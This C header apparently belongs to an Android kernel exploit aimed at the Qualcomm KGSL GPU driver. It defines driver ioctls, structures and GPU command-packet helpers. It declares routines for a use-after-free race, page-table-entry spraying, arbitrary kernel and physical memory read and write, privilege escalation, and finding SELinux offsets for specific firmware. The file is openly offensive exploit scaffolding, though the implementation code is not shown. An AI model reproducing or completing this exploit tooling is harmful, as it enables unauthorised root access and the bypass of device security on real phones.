#pragma once
#include <ctype.h>
#include <stdio.h>
#include <spawn.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h> 
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/syscall.h>

#include <android/log.h>
#include <sys/system_properties.h>

#include "term.h"
#include "cfg.h"

#define MYTAG           "PICOHAXX"
#define FINALCOMM       "IBIMS1HACK"
#define SPRAYER_COMM    "SPR_%05d"

#define chlog(log, ...) ;

#define log0(log, ...) __android_log_print(ANDROID_LOG_FATAL, MYTAG,log,##__VA_ARGS__);
#define log1(log, ...) { fprintf(stderr, log "\n" , ##__VA_ARGS__);fflush(stderr); }
#define log1n(log,...) { fprintf(stderr, log, ##__VA_ARGS__);fflush(stderr); }
#define log2(log, ...) log2n(log "\n", ##__VA_ARGS__)

static inline void log2n(const char * log, ...)
{
   char tmp[1024*128];

   va_list ap;
   va_start(ap, log);
   vsnprintf(tmp, 1024*128, log, ap);
   fputs(tmp, stderr);
   fflush(stderr);
   __android_log_vprint(ANDROID_LOG_FATAL, MYTAG,log, ap);
}

void hexdump(void* _data, size_t byte_count, char* title, uint64_t offset);
int dospawn(const char *filename, ...);
int escalate_privs();
void Restore_PTE();
void cleanup_uaf();
void pte_sprayer(int i);

#define hexdump_starty  2
#define hexdump_endy    (gettermy()-10)

#define MB(mb) (mb * 1024 * 1024)

enum { 
   CMD_IDENTFY = 10, 
   CMD_QUIT, 
   CMD_READPAGE, 
   CMD_READ64,  CMD_READ32,  CMD_READ8,
   CMD_WRITE64, CMD_WRITE32, CMD_WRITE8 
};

#define RW_SILENT ((char*)1)

#define PTE2PHYS(pte) (pte&PFN_MASK)
#define MAKEPTE(addr) (PTE2PHYS(addr)|PTE_FLAGS)
#define PAGEOFFSET(addr) (addr&(0x1000-1))
#define PAGE(addr)       (addr&~(0x1000-1))

static const uint64_t ALIGN_4K  = 0x1000;
static const uint64_t ALIGN_2MB = 0x200000;
static const uint64_t MASK_4K   = ALIGN_4K - 1;
static const uint64_t MASK_2MB  = ALIGN_2MB - 1;

#define PAGE_SIZE       4096
#define PAGE_MASK       (~(PAGE_SIZE - 1))
#define PAGE_ALIGN(x) (((x) + PAGE_SIZE - 1) & PAGE_MASK)

// KGSL UAPI & FLAGS
#define DEV_PATH                    "/dev/kgsl-3d0"
#define KGSL_MEMFLAGS_USE_CPU_MAP   0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR     0x00000002U
#define KGSL_CONTEXT_NO_GMEM_ALLOC  0x00000002
#define KGSL_CONTEXT_PREAMBLE       0x00000010
#define KGSL_CMDLIST_IB             0x00000001U
#define KGSL_TIMESTAMP_RETIRED      0x00000002
#define CP_NOP                      0x10
#define CP_MEM_WRITE                0x3D
#define CP_MEM_TO_MEM               0x73
#define KGSL_IOC_TYPE               0x09

#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE  _IOW(KGSL_IOC_TYPE,  0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOWR(KGSL_IOC_TYPE,0x14, struct kgsl_drawctxt_destroy)
#define IOCTL_KGSL_GPUOBJ_INFO     _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
#define IOCTL_KGSL_GPU_COMMAND     _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

struct kgsl_drawctxt_create { unsigned flags, drawctxt_id; };
struct kgsl_drawctxt_destroy { unsigned int drawctxt_id; };
struct kgsl_command_object { uint64_t offset, gpuaddr, size; unsigned flags, id; };

struct kgsl_gpu_command {
    uint64_t flags, cmdlist; unsigned cmdsize, numcmds;
    uint64_t objlist; unsigned objsize, numobjs;
    uint64_t synclist; unsigned syncsize, numsyncs, context_id, timestamp;
};

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned context_id, type, timestamp; };
struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned id; };

int8_t  Read8(uint64_t va, char* info);
int32_t Read32(uint64_t va, char* info);
int64_t Read64(uint64_t va, char* info);

void Write8(uint64_t va, uint8_t data, char* info);
void Write32(uint64_t va, uint32_t data, char* info);
void Write64(uint64_t va, uint64_t data, char* info);
int read_phys_page(uint64_t phys_address, void* buffer);

void postExploit(int first);
int file_append(char * filename, void* buffer, size_t len, int reset);
int kbhit();

int gpu_read(uint64_t src_gpu_va, uint32_t *out_data, size_t num_dwords);
int gpu_write(uint64_t dst_gpu_va, uint32_t *data, size_t num_dwords);
int gpu_write32(uint64_t dst_gpu_va, uint32_t value);
int gpu_write64(uint64_t dst_gpu_va, uint64_t value);

void ftpd(int port);

void pseudo_flushTLB();
double diff(const char* label);
uint64_t check_and_get_selinux_offset_for_current_firmware();

static inline void *mmap_gpuobj_fixed(int fd, unsigned int id, uint64_t mmapsize, void *fixed_addr) {
    off_t offset = ((off_t)id) << 12;
    return mmap(fixed_addr, mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, fd, offset);
}

static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val) {
    return (0x9669u >> (0xFu & (val ^ (val >> 4) ^ (val >> 8) ^ (val >> 12) ^
                                (val >> 16) ^ (val >> 20) ^ (val >> 24) ^ (val >> 28)))) & 1u;
}

static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt) {
    return (7u << 28) | ((cnt & 0x3FFFu) << 0) | (pm4_calc_odd_parity_bit(cnt) << 15)
         | ((opcode & 0x7Fu) << 16) | (pm4_calc_odd_parity_bit(opcode) << 23);
}

static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len; uint64_t mmapsize;
    unsigned int id; unsigned int metadata_len; uint64_t metadata;
};

struct kgsl_gpuobj_free {
    uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len;
};

struct kgsl_map_user_mem {
    int fd; unsigned long gpuaddr; size_t len; size_t offset;
    unsigned long hostptr; unsigned int memtype; unsigned int flags;
};

struct pte_hit {
 uint64_t gpu_va_page;              // address of the 4k page
    uint64_t gpu_va_pte;            // address of the entry
    uint64_t original_pte;          // original ptr
    int entry_index;                // 0-511
};

typedef struct {
    int   do_action;
    pid_t pid;
    uint64_t address;
    uint64_t data;
    void* base;
    void* pte_mapping;
    struct timespec t[4];
    char exitMessage[256];
    int mappings;
    int scanned;
    int numchilds;
} spray_slot_t;

typedef struct {
    int fd;
    volatile int ready;
    volatile int bogus_started;
    volatile int result;
    volatile int saved_errno;
} race_state_t;

struct uaf_state {
    unsigned int uaf_id;
    unsigned int overlap_id;
    unsigned int ph_id;
    uint64_t uaf_mmapsize;
    uint64_t overlap_mmapsize;
    uint64_t ph_mmapsize;
    void *overlap_vma;
    void *ph_vma;
    void *bogus_vma;
};

extern char **g_custom_spawn_args;
extern int g_headless, g_dbg;

static inline int isdbg() { return g_dbg; }
static inline int isdbg2() { return g_dbg==2; }

#define ifdbg2  if(g_dbg == 2) 
#define ifdbg   if(g_dbg > 0) 
#define ifndbg  if(g_dbg == 0) 

#define log64(var)         fnlog64(var,#var);
#define log64n(var, name)  fnlog64(var,name);

static inline void setdbg(int dbg) {
    g_dbg=dbg;
    log2(g_dbg ?  "debug on" : "debug off" );
}

static inline uint64_t fnlog64(uint64_t val, const char *info)
{
   log2(bold(blue("%s: %016lx")), info, val);
   return val;
}

static int isRoot()
{
    return system("test -r /data/data > /dev/null") == 0;
}

static int getenforce()
{
    return system("getenforce|grep -i enforcing > /dev/null") == 0;
}

static char *strcatf(char *__dst, const char *__fmt, ...)
{
    va_list ap;
    va_start(ap, __fmt);
    vsprintf(__dst + strlen(__dst), __fmt, ap);
    va_end(ap);
    return __dst;
}

static inline void sleepms(int ms)
{
    usleep(ms*1000);
}

#define TS_CHAR(i) (__TIMESTAMP__[i])
#define TS_MONTH \
    (TS_CHAR(4) == 'J' && TS_CHAR(5) == 'a' && TS_CHAR(6) == 'n' ? 1 : \
     TS_CHAR(4) == 'F' && TS_CHAR(5) == 'e' && TS_CHAR(6) == 'b' ? 2 : \
     TS_CHAR(4) == 'M' && TS_CHAR(5) == 'a' && TS_CHAR(6) == 'r' ? 3 : \
     TS_CHAR(4) == 'A' && TS_CHAR(5) == 'p' && TS_CHAR(6) == 'r' ? 4 : \
     TS_CHAR(4) == 'M' && TS_CHAR(5) == 'a' && TS_CHAR(6) == 'y' ? 5 : \
     TS_CHAR(4) == 'J' && TS_CHAR(5) == 'u' && TS_CHAR(6) == 'n' ? 6 : \
     TS_CHAR(4) == 'J' && TS_CHAR(5) == 'u' && TS_CHAR(6) == 'l' ? 7 : \
     TS_CHAR(4) == 'A' && TS_CHAR(5) == 'u' && TS_CHAR(6) == 'g' ? 8 : \
     TS_CHAR(4) == 'S' && TS_CHAR(5) == 'e' && TS_CHAR(6) == 'p' ? 9 : \
     TS_CHAR(4) == 'O' && TS_CHAR(5) == 'c' && TS_CHAR(6) == 't' ? 10 : \
     TS_CHAR(4) == 'N' && TS_CHAR(5) == 'o' && TS_CHAR(6) == 'v' ? 11 : \
     TS_CHAR(4) == 'D' && TS_CHAR(5) == 'e' && TS_CHAR(6) == 'c' ? 12 : 0)

#define VERSION_YEAR  ((TS_CHAR(20) - '0') * 1000 + (TS_CHAR(21) - '0') * 100 + (TS_CHAR(22) - '0') * 10 + (TS_CHAR(23) - '0'))
#define VERSION_MONTH (TS_MONTH)
#define VERSION_DAY   ((TS_CHAR(8) == ' ' ? 0 : (TS_CHAR(8) - '0') * 10) + (TS_CHAR(9) - '0'))
#define VERSION_HOUR  ((TS_CHAR(11) - '0') * 10 + (TS_CHAR(12) - '0'))
#define VERSION_MIN   ((TS_CHAR(14) - '0') * 10 + (TS_CHAR(15) - '0'))

static char ver[256]={0};
static inline char* getVer()
{
    strcatf(ver, "build %04x",(VERSION_YEAR-2026)*0x1000+(VERSION_MONTH*30+VERSION_DAY)*10+(VERSION_HOUR/3));
    // return "build: ";
    return ver;
}
static inline void simulate() { g_simulate=1; }
static inline int simulated() { return g_simulate; }

char* system_property_get_string(const char* name, char* str);
void print_usage(const char *szArg0);
void kill_all_childs(int except);
int systemf(const char *__fmt, ...);
int system_property_get_int(const char *name);

// int supaexec(char *szCommand);
int supaexec(const char *filename, ...);
int supaexecf(const char *__fmt, ...);

#define PLAY_SOUND(sound)    if(g_sound) systemf("%s", bundle_file(sound));
#define PLAY_SOUND_BG(sound) if(g_sound) supaexecf("%s", bundle_file(sound))

int unroot();
void pte_sprayer_emitt(int i);
void pte_sprayer_check_your_mappings(int i);
void physmem_operator(int i);
void show_child_timings();

uint64_t find_selinux_offset_for_firmware();
